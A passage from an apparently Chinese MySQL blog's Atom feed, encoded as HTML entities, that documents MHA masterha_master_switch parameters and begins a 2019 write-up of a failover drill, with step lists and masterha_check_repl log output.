&#x6B64;&#x53C2;&#x6570;&#x4ECE;0.56&#x7248;&#x672C;&#x5F00;&#x59CB;&#x53EF;&#x7528;&#xFF0C;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x6210;1&#xFF0C;&#x5F53;&#x57FA;&#x4E8E;GITD&#x7684;failover&#x65F6;,MHA &#x4F1A;&#x7B49;&#x5F85;&#x6240;&#x6709;&#x7684;&#x4ECE;&#x5E93;&#x8FFD;&#x4E0A;&#x65B0;&#x4E3B;&#x5E93;&#x7684;GITD</span><br><span class="line"> </span><br><span class="line">--skip_change_master</span><br><span class="line">    &#x6B64;&#x53C2;&#x6570;&#x4ECE;0.56&#x7248;&#x672C;&#x5F00;&#x59CB;&#x53EF;&#x7528;&#xFF0C;&#x5982;&#x679C;&#x5F00;&#x542F;&#x6B64;&#x9009;&#x9879;&#xFF0C;MHA &#x8DF3;&#x8FC7; CHANGE MASTER &#x7684;&#x64CD;&#x4F5C;</span><br><span class="line"> </span><br><span class="line">--skip_disable_read_only</span><br><span class="line">    &#x6B64;&#x53C2;&#x6570;&#x4ECE;0.56&#x7248;&#x672C;&#x5F00;&#x59CB;&#x53EF;&#x7528;&#xFF0C;&#x5982;&#x679C;&#x5F00;&#x542F;&#x6B64;&#x9009;&#x9879;&#xFF0C;MHA &#x5C06;&#x4F1A;&#x5728;&#x65B0;&#x7684;master &#x8DF3;&#x8FC7; SET GLOBAL read_only = 0;</span><br><span class="line"> </span><br><span class="line">--ignore_binlog_server_error</span><br><span class="line">    &#x6B64;&#x53C2;&#x6570;&#x4ECE;0.56&#x7248;&#x672C;&#x5F00;&#x59CB;&#x53EF;&#x7528;&#xFF0C;&#x5982;&#x679C;&#x5F00;&#x542F;&#x6B64;&#x9009;&#x9879;&#xFF0C;&#x5F53;&#x6267;&#x884C;failover&#x7684;&#x65F6;&#xFF0C;MHA&#x5FFD;&#x7565;binlog server&#x4E0A;&#x4EFB;&#x4F55;&#x9519;&#x8BEF;</span><br></pre></td></tr></tbody></table></figure><p></p><h5 id="&#x4E3B;&#x5728;&#x7EBF;&#x5207;&#x6362;&#x65F6;&#x76F8;&#x5173;&#x53C2;&#x6570;"><a href="#&#x4E3B;&#x5728;&#x7EBF;&#x5207;&#x6362;&#x65F6;&#x76F8;&#x5173;&#x53C2;&#x6570;" class="headerlink" title="&#x4E3B;&#x5728;&#x7EBF;&#x5207;&#x6362;&#x65F6;&#x76F8;&#x5173;&#x53C2;&#x6570;"></a>&#x4E3B;&#x5728;&#x7EBF;&#x5207;&#x6362;&#x65F6;&#x76F8;&#x5173;&#x53C2;&#x6570;</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--new_master_host=(hostname)</span><br><span class="line">    &#x65B0;&#x4E3B;&#x673A;&#x5730;&#x5740;&#xFF0C;&#x53EF;&#x9009;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x5728;&#x4F60;&#x660E;&#x786E;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#x7684;&#x4E3B;&#x673A;&#xFF0C;&#x975E;&#x5E38;&#x6709;&#x7528;&#x3002;(&#x8FD9;&#x5C31;&#x610F;&#x5473;&#x7740;&#x4F60;&#x4E0D;&#x9700;&#x8981;&#x8BA9;MHA&#x6765;&#x51B3;&#x5B9A;&#x65B0;&#x7684;&#x4E3B;&#x5E93;)&#x3002;&#x5982;&#x679C;&#x4E0D;&#x8BBE;&#x7F6E;&#x6B64;&#x53C2;&#x6570;&#xFF0C;MHA &#x5C06;&#x4F1A;&#x5229;&#x7528;&#x81EA;&#x52A8;failover&#x7684;&#x89C4;&#x5219;&#x6765;&#x9009;&#x62E9;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;--new_master_host&#xFF0C;MHA&#x9009;&#x62E9;&#x6B64;&#x4E3B;&#x673A;&#x4E3A;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x80FD;&#x6210;&#x4E3A;&#x4E3B;&#x5E93;&#xFF0C;MHA&#x5C06;&#x4F1A;&#x9000;&#x51FA;</span><br><span class="line"> </span><br><span class="line">--orig_master_is_new_slave</span><br><span class="line">    &#x5F53;&#x5B8C;&#x6210;&#x4E3B;&#x5E93;&#x5207;&#x6362;&#x540E;&#xFF0C;&#x539F;&#x5148;&#x7684;&#x4E3B;&#x5E93;&#x5C06;&#x4F5C;&#x4E3A;&#x73B0;&#x5728;&#x4E3B;&#x5E93;&#x7684;slave&#x8FD0;&#x884C;&#x3002;&#x9ED8;&#x8BA4;:&#x4E0D;&#x5F00;&#x542F;(&#x539F;&#x5148;&#x7684;&#x4E3B;&#x5E93;&#x4E0D;&#x4F1A;&#x52A0;&#x5165;&#x5230;&#x65B0;&#x7684;&#x590D;&#x5236;&#x73AF;&#x5883;&#x4E2D;)&#x3002;&#x5982;&#x679C;&#x5F00;&#x542F;&#x6B64;&#x9009;&#x9879;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;repl_password&#x53C2;&#x6570;&#xFF0C;&#x7531;&#x4E8E;&#x5F53;&#x671F;&#x7684;Master&#x5E76;&#x4E0D;&#x77E5;&#x9053;&#x65B0;&#x7684;Master&#x7684;replication&#x7684;&#x5BC6;&#x7801;</span><br><span class="line"> </span><br><span class="line">--remove_orig_master_conf</span><br><span class="line">    &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x6B64;&#x53C2;&#x6570;&#xFF0C;&#x5F53;&#x6210;&#x529F;failover&#x540E;&#xFF0C;MHA manager&#x5C06;&#x4F1A;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x5173;&#x4E8E;dead master&#x7684;&#x914D;&#x7F6E;&#x9009;&#x9879;&#x3002;</span><br><span class="line"> </span><br><span class="line">--skip_lock_all_tables</span><br><span class="line">    &#x5F53;&#x5728;&#x505A;&#x4E3B;&#x5E93;&#x5207;&#x6362;&#x7684;&#x65F6;&#x5019;&#xFF0C;MHA&#x4F1A;&#x5728;&#x539F;&#x5148;&#x7684;&#x4E3B;&#x5E93;&#x4E0A;&#x6267;&#x884C;FLUSH TABLES WITH READ LOCK &#x64CD;&#x4F5C;&#xFF0C;&#x786E;&#x4FDD;&#x6CA1;&#x6709;&#x8DDF;&#x65B0;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x662F;FLUSH TABLES WITH READ LOCK &#x64CD;&#x4F5C;&#x662F;&#x975E;&#x5E38;&#x8017;&#x8D39;&#x8D44;&#x6E90;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x539F;&#x5148;&#x7684;&#x4E3B;&#x5E93;&#x786E;&#x5B9A;&#x6CA1;&#x6709;&#x8DDF;&#x65B0;&#x64CD;&#x4F5C;(&#x901A;&#x8FC7;master_ip_online_change_script &#x4E2D;<span class="built_in">kill</span> all clients&#x64CD;&#x4F5C;&#x7B49;)&#x3002;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6B64;&#x9009;&#x9879;&#x907F;&#x514D;&#x9501;&#x8868;&#x3002;</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;MHA-&amp;#x547D;&amp;#x4EE4;-masterha-master-switch&quot;&gt;&lt;a href=&quot;#MHA-&amp;#x547D;&amp;#x4EE4;-masterha-master-switch&quot; class=&quot;headerlink&quot; title=&quot;MHA &amp;#
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
      <category term="MHA" scheme="https://jiemin.wang/categories/MySQL/MHA/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
      <category term="MHA" scheme="https://jiemin.wang/tags/MHA/"/>
    
  </entry>
  
  <entry>
    <title>MHA 故障切换演练 --- masterha_master_switch</title>
    <link href="https://jiemin.wang/2019/03/28/mha-switch/"/>
    <id>https://jiemin.wang/2019/03/28/mha-switch/</id>
    <published>2019-03-28T02:33:34.000Z</published>
    <updated>2019-03-28T11:48:11.513Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#x6628;&#x5929;&#x516C;&#x53F8;&#x8981;&#x8FDB;&#x884C;&#x7EBF;&#x4E0A;MHA&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x6545;&#x969C;&#x5207;&#x6362;&#x6F14;&#x7EC3;&#x3002;&#x7531;&#x4E8E;&#x6211;&#x521A;&#x5165;&#x804C;&#x516C;&#x53F8;&#x3002;&#x516C;&#x53F8;&#x8FD8;&#x6CA1;&#x6709;&#x505A;&#x8FC7;&#x592A;&#x591A;&#x7684;&#x707E;&#x96BE;&#x7EA7;&#x522B;&#x7684;&#x6545;&#x969C;&#x6F14;&#x7EC3;&#x3002;</p><h5 id="&#x6211;&#x5199;&#x4E86;&#x4E00;&#x4E9B;&#x6B65;&#x9AA4;&#xFF1A;"><a href="#&#x6211;&#x5199;&#x4E86;&#x4E00;&#x4E9B;&#x6B65;&#x9AA4;&#xFF1A;" class="headerlink" title="&#x6211;&#x5199;&#x4E86;&#x4E00;&#x4E9B;&#x6B65;&#x9AA4;&#xFF1A;"></a>&#x6211;&#x5199;&#x4E86;&#x4E00;&#x4E9B;&#x6B65;&#x9AA4;&#xFF1A;</h5><h6 id="&#x6545;&#x969C;&#x5207;&#x6362;"><a href="#&#x6545;&#x969C;&#x5207;&#x6362;" class="headerlink" title="&#x6545;&#x969C;&#x5207;&#x6362;"></a>&#x6545;&#x969C;&#x5207;&#x6362;</h6><ol><li>&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x5EF6;&#x8FDF;&#x72B6;&#x6001;</li><li>&#x767B;&#x5F55;MHA&#x4E2D;&#x63A7;&#x673A;&#xFF0C;&#x67E5;&#x770B;&#x6F14;&#x7EC3;&#x5207;&#x6362;&#x7684;&#x6570;&#x636E;&#x5E93;MHA log&#x6587;&#x4EF6;&#xFF0C;&#x4F7F;&#x7528;tail -f &#x547D;&#x4EE4;&#x6765;&#x83B7;&#x53D6;&#x5207;&#x6362;&#x7684;log&#x65E5;&#x5FD7;&#x4FE1;&#x606F;</li><li>&#x767B;&#x5F55;master&#x673A;&#x5668;&#xFF0C;&#x6267;&#x884C; /etc/init.d/mysql stop</li><li>&#x67E5;&#x770B;MHA&#x4E2D;&#x63A7;&#x673A;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#x3002;</li><li>&#x5207;&#x6362;&#x6210;&#x529F;&#xFF0C;&#x767B;&#x5F55;&#x5230; new_master &#x4E2D;&#x67E5;&#x770B;vip&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x7ED1;&#x5B9A;&#x5230;&#x7F51;&#x5361;&#x4E0A;</li><li>&#x767B;&#x5F55;slave&#xFF0C;&#x67E5;&#x770B; show slave status &#x662F;&#x5426;&#x5DF2;&#x7ECF;change master to new_master ip&#x4E0A;&#xFF0C;&#x67E5;&#x770B;slave&#x6B63;&#x5E38;&#x4E0E;&#x5426;</li><li>&#x5728; MHA &#x4E2D;&#x63A7;&#x673A;&#x542F;&#x52A8; masterha_manager &#x8FDB;&#x7A0B;&#xFF0C;&#x67E5;&#x770B;MHA&#x96C6;&#x7FA4;&#x542F;&#x52A8;&#x662F;&#x5426;&#x6B63;&#x5E38;&#x3002;(&#x4E24;&#x8282;&#x70B9;)<br>&#x7ED3;&#x6784;&#x56FE;&#xFF1A;<br>new_master: (master)<br>&#x2014;&gt; slave: (slave)</li></ol><h6 id="master-&#x6570;&#x636E;&#x5E93;&#x6062;&#x590D;"><a href="#master-&#x6570;&#x636E;&#x5E93;&#x6062;&#x590D;" class="headerlink" title="master &#x6570;&#x636E;&#x5E93;&#x6062;&#x590D;"></a>master &#x6570;&#x636E;&#x5E93;&#x6062;&#x590D;</h6><ol><li>&#x767B;&#x5F55;&#x5230;old_master &#x673A;&#x5668;&#x4E0A;&#x6267;&#x884C; /etc/init.d/mysql start &#x662F;&#x5426;&#x6B63;&#x5E38;&#x542F;&#x52A8;&#x670D;&#x52A1;</li><li>&#x5728;MHA&#x4E2D;&#x63A7;&#x673A;&#x4E2D;&#x83B7;&#x53D6;&#x5207;&#x6362;&#x7684;log &#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#x627E;&#x51FA; change master to new_master &#x4FE1;&#x606F;&#x8BED;&#x53E5;</li><li>&#x5728;old_master &#x4E2D;&#x6267;&#x884C;change master to &#x8BED;&#x53E5;&#xFF0C;&#x53D8;&#x4E3A; new_master&#x7684;slave</li><li>show slave status &#x67E5;&#x770B; old_master &#x662F;&#x5426;&#x6B63;&#x5E38;&#x53D8;&#x4E3A; new_master &#x7684;slave</li><li>&#x5728;MHA &#x4E2D;&#x63A7;&#x673A;&#x8282;&#x70B9;&#xFF0C;&#x6267;&#x884C; masterha_stop &#x547D;&#x4EE4;&#x7ED3;&#x675F; masterha_manager&#x8FDB;&#x7A0B;&#x3002;</li><li>&#x5728;MHA &#x4E2D;&#x63A7;&#x673A;&#x542F;&#x52A8; masterha_manager &#x8FDB;&#x7A0B;&#xFF0C;&#x67E5;&#x770B;&#x6062;&#x590D;&#x597D;&#x7684;old_master&#x662F;&#x5426;&#x6B63;&#x5E38;&#x52A0;&#x5165;&#x5230;MHA&#x8282;&#x70B9; (&#x4E09;&#x8282;&#x70B9;&#xFF09;<br>&#x7ED3;&#x6784;&#x56FE;&#xFF1A;<br>new_master: (master)<br>&#x2014;&gt; old_master: (slave)<br>&#x2014;&gt; slave: (slave)</li></ol><h6 id="&#x6062;&#x590D;-old-master&#x4E3A;-master-&#x89D2;&#x8272;"><a href="#&#x6062;&#x590D;-old-master&#x4E3A;-master-&#x89D2;&#x8272;" class="headerlink" title="&#x6062;&#x590D; old_master&#x4E3A; master &#x89D2;&#x8272;"></a>&#x6062;&#x590D; old_master&#x4E3A; master &#x89D2;&#x8272;</h6><ol><li>&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x5EF6;&#x8FDF;&#x72B6;&#x6001;</li><li>&#x767B;&#x5F55;MHA&#x4E2D;&#x63A7;&#x673A;&#xFF0C;&#x67E5;&#x770B;&#x6F14;&#x7EC3;&#x5207;&#x6362;&#x7684;&#x6570;&#x636E;&#x5E93;MHA log&#x6587;&#x4EF6;&#xFF0C;&#x4F7F;&#x7528;tail -f &#x547D;&#x4EE4;&#x6765;&#x83B7;&#x53D6;&#x5207;&#x6362;&#x7684;log&#x65E5;&#x5FD7;&#x4FE1;&#x606F;</li><li>&#x767B;&#x5F55;new_master&#x673A;&#x5668;&#xFF0C;&#x6267;&#x884C; /etc/init.d/mysql stop</li><li>&#x67E5;&#x770B;MHA&#x4E2D;&#x63A7;&#x673A;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#x3002;</li><li>&#x5207;&#x6362;&#x6210;&#x529F;&#xFF0C;&#x767B;&#x5F55;&#x5230; old_master &#x4E2D;&#x67E5;&#x770B;vip&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x7ED1;&#x5B9A;&#x5230;&#x7F51;&#x5361;&#x4E0A;</li><li>&#x767B;&#x5F55;slave&#xFF0C;&#x67E5;&#x770B; show slave status &#x662F;&#x5426;&#x5DF2;&#x7ECF;change master to old_master ip&#x4E0A;&#xFF0C;&#x67E5;&#x770B;slave&#x6B63;&#x5E38;&#x4E0E;&#x5426;</li><li>&#x5728; MHA &#x4E2D;&#x63A7;&#x673A;&#x542F;&#x52A8; masterha_manager &#x8FDB;&#x7A0B;&#xFF0C;&#x67E5;&#x770B;MHA&#x96C6;&#x7FA4;&#x542F;&#x52A8;&#x662F;&#x5426;&#x6B63;&#x5E38;&#x3002;(&#x4E24;&#x8282;&#x70B9;)<br>&#x7ED3;&#x6784;&#x56FE;&#xFF1A;<br>master(old_master): (master)<br>&#x2014;&gt; slave(new_master): (slave)<br>&#x2014;&gt; slave: (slave)</li></ol><h5 id="&#x4F46;&#x662F;&#x8FD9;&#x4E48;&#x64CD;&#x4F5C;&#x867D;&#x7136;&#x80FD;&#x66F4;&#x8D34;&#x8FD1;&#x771F;&#x5B9E;&#x707E;&#x96BE;-&#x6682;&#x65F6;&#x6CA1;&#x6709;&#x628A;&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5EF6;&#x8FDF;&#x8003;&#x8651;&#x8FDB;&#x5165;-&#xFF0C;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#x4F1A;&#x66F4;&#x591A;&#x3002;&#x9886;&#x5BFC;&#x5EFA;&#x8BAE;&#x624B;&#x52A8;&#x64CD;&#x4F5C;MHA-failover&#x6D4B;&#x8BD5;&#x80FD;&#x4E0D;&#x80FD;&#x5207;&#x6362;&#x3002;"><a href="#&#x4F46;&#x662F;&#x8FD9;&#x4E48;&#x64CD;&#x4F5C;&#x867D;&#x7136;&#x80FD;&#x66F4;&#x8D34;&#x8FD1;&#x771F;&#x5B9E;&#x707E;&#x96BE;-&#x6682;&#x65F6;&#x6CA1;&#x6709;&#x628A;&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5EF6;&#x8FDF;&#x8003;&#x8651;&#x8FDB;&#x5165;-&#xFF0C;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#x4F1A;&#x66F4;&#x591A;&#x3002;&#x9886;&#x5BFC;&#x5EFA;&#x8BAE;&#x624B;&#x52A8;&#x64CD;&#x4F5C;MHA-failover&#x6D4B;&#x8BD5;&#x80FD;&#x4E0D;&#x80FD;&#x5207;&#x6362;&#x3002;" class="headerlink" title="&#x4F46;&#x662F;&#x8FD9;&#x4E48;&#x64CD;&#x4F5C;&#x867D;&#x7136;&#x80FD;&#x66F4;&#x8D34;&#x8FD1;&#x771F;&#x5B9E;&#x707E;&#x96BE;(&#x6682;&#x65F6;&#x6CA1;&#x6709;&#x628A;&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5EF6;&#x8FDF;&#x8003;&#x8651;&#x8FDB;&#x5165;)&#xFF0C;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#x4F1A;&#x66F4;&#x591A;&#x3002;&#x9886;&#x5BFC;&#x5EFA;&#x8BAE;&#x624B;&#x52A8;&#x64CD;&#x4F5C;MHA failover&#x6D4B;&#x8BD5;&#x80FD;&#x4E0D;&#x80FD;&#x5207;&#x6362;&#x3002;"></a>&#x4F46;&#x662F;&#x8FD9;&#x4E48;&#x64CD;&#x4F5C;&#x867D;&#x7136;&#x80FD;&#x66F4;&#x8D34;&#x8FD1;&#x771F;&#x5B9E;&#x707E;&#x96BE;(&#x6682;&#x65F6;&#x6CA1;&#x6709;&#x628A;&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5EF6;&#x8FDF;&#x8003;&#x8651;&#x8FDB;&#x5165;)&#xFF0C;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#x4F1A;&#x66F4;&#x591A;&#x3002;&#x9886;&#x5BFC;&#x5EFA;&#x8BAE;&#x624B;&#x52A8;&#x64CD;&#x4F5C;MHA failover&#x6D4B;&#x8BD5;&#x80FD;&#x4E0D;&#x80FD;&#x5207;&#x6362;&#x3002;</h5><h2 id="&#x670D;&#x52A1;&#x5668;&#x67B6;&#x6784;"><a href="#&#x670D;&#x52A1;&#x5668;&#x67B6;&#x6784;" class="headerlink" title="&#x670D;&#x52A1;&#x5668;&#x67B6;&#x6784;"></a>&#x670D;&#x52A1;&#x5668;&#x67B6;&#x6784;</h2><table><thead><tr><th style="text-align:center">server</th><th style="text-align:center">role</th></tr></thead><tbody><tr><td style="text-align:center">master</td><td style="text-align:center">old_master</td></tr><tr><td style="text-align:center">slave</td><td style="text-align:center">new_master</td></tr><tr><td style="text-align:center">slave</td><td style="text-align:center">slave</td></tr></tbody></table><h2 id="&#x5177;&#x4F53;&#x64CD;&#x4F5C;"><a href="#&#x5177;&#x4F53;&#x64CD;&#x4F5C;" class="headerlink" title="&#x5177;&#x4F53;&#x64CD;&#x4F5C;"></a>&#x5177;&#x4F53;&#x64CD;&#x4F5C;</h2><p>&#x5728;MHA &#x4E2D;&#x63A7;&#x673A;&#x4E2D;&#x6267;&#x884C;&#x547D;&#x4EE4;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># masterha_check_repl --conf=/root/dba/mha/conf/babybi_#1.conf</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">Wed Mar 27 23:28:28 2019 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Reading application default configuration from /root/dba/mha/conf/babybi_<span class="comment">#1.conf..</span></span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Reading server configuration from /root/dba/mha/conf/babybi_<span class="comment">#1.conf..</span></span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] MHA::MasterMonitor version 0.56.</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] GTID failover mode = 0</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Dead Servers:</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Alive Servers:</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.67(10.25.1.67:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.68(10.25.1.68:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Alive Slaves:</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.67(10.25.1.67:3306)  Version=5.6.29-76.2-log (oldest major version between slaves) <span class="built_in">log</span>-bin:enabled</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]     Replicating from 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]     Primary candidate <span class="keyword">for</span> the new Master (candidate_master is <span class="built_in">set</span>)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]   10.25.1.68(10.25.1.68:3306)  Version=5.6.29-76.2-log (oldest major version between slaves) <span class="built_in">log</span>-bin:enabled</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]     Replicating from 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Current Alive Master: 10.25.1.66(10.25.1.66:3306)</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Checking slave configurations..</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [warning]  relay_log_purge=0 is not <span class="built_in">set</span> on slave 10.25.1.67(10.25.1.67:3306).</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [warning]  relay_log_purge=0 is not <span class="built_in">set</span> on slave 10.25.1.68(10.25.1.68:3306).</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Checking replication filtering settings..</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]  binlog_do_db= , binlog_ignore_db= </span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info]  Replication filtering check ok.</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] GTID (with auto-pos) is not supported</span><br><span class="line">Wed Mar 27 23:28:28 2019 - [info] Starting SSH connection tests..</span><br><span class="line">Wed Mar 27 23:28:29 2019 - [info] All SSH connection tests passed successfully.</span><br><span class="line">Wed Mar 27 23:28:29 2019 - [info] Checking MHA Node version..</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info]  Version check ok.</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info] Checking SSH publickey authentication settings on the current master..</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info] HealthCheck: SSH to 10.25.1.66 is reachable.</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info] Master MHA Node version is 0.56.</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info] Checking recovery script configurations on 10.25.1.66(10.25.1.66:3306)..</span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info]   Executing <span class="built_in">command</span>: save_binary_logs --<span class="built_in">command</span>=<span class="built_in">test</span> --start_pos=4 --binlog_dir=/<span class="built_in">log</span>/mysql/binlog/ --output_file=/var/tmp/save_binary_logs_test --manager_version=0.56 --start_file=mysql-bin.004691 </span><br><span class="line">Wed Mar 27 23:28:30 2019 - [info]   Connecting to root@10.25.1.66(10.25.1.66:22).. </span><br><span class="line">  Creating /var/tmp <span class="keyword">if</span> not exists..    ok.</span><br><span class="line">  Checking output directory is accessible or not..</span><br><span class="line">   ok.</span><br><span class="line">  Binlog found at /<span class="built_in">log</span>/mysql/binlog/, up to mysql-bin.004691</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Binlog setting check <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info] Checking SSH publickey authentication and checking recovery script configurations on all alive slave servers..</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   Executing <span class="built_in">command</span> : apply_diff_relay_logs --<span class="built_in">command</span>=<span class="built_in">test</span> --slave_user=<span class="string">&apos;mha&apos;</span> --slave_host=10.25.1.67 --slave_ip=10.25.1.67 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.29-76.2-log --manager_version=0.56 --relay_log_info=/my/data/percona/relay-log.info  --relay_dir=/my/data/percona/  --slave_pass=xxx</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   Connecting to root@10.25.1.67(10.25.1.67:22).. </span><br><span class="line">  Checking slave recovery environment settings..</span><br><span class="line">    Opening /my/data/percona/relay-log.info ... ok.</span><br><span class="line">    Relay <span class="built_in">log</span> found at /<span class="built_in">log</span>/mysql/relaylog, up to relay-log.014072</span><br><span class="line">    Temporary relay <span class="built_in">log</span> file is /<span class="built_in">log</span>/mysql/relaylog/relay-log.014072</span><br><span class="line">    Testing mysql connection and privileges..Warning: Using a password on the <span class="built_in">command</span> line interface can be insecure.</span><br><span class="line"> <span class="keyword">done</span>.</span><br><span class="line">    Testing mysqlbinlog output.. <span class="keyword">done</span>.</span><br><span class="line">    Cleaning up <span class="built_in">test</span> file(s).. <span class="keyword">done</span>.</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   Executing <span class="built_in">command</span> : apply_diff_relay_logs --<span class="built_in">command</span>=<span class="built_in">test</span> --slave_user=<span class="string">&apos;mha&apos;</span> --slave_host=10.25.1.68 --slave_ip=10.25.1.68 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.29-76.2-log --manager_version=0.56 --relay_log_info=/my/data/percona/relay-log.info  --relay_dir=/my/data/percona/  --slave_pass=xxx</span><br><span class="line">Wed Mar 27 23:28:31 2019 - [info]   Connecting to root@10.25.1.68(10.25.1.68:22).. </span><br><span class="line">  Checking slave recovery environment 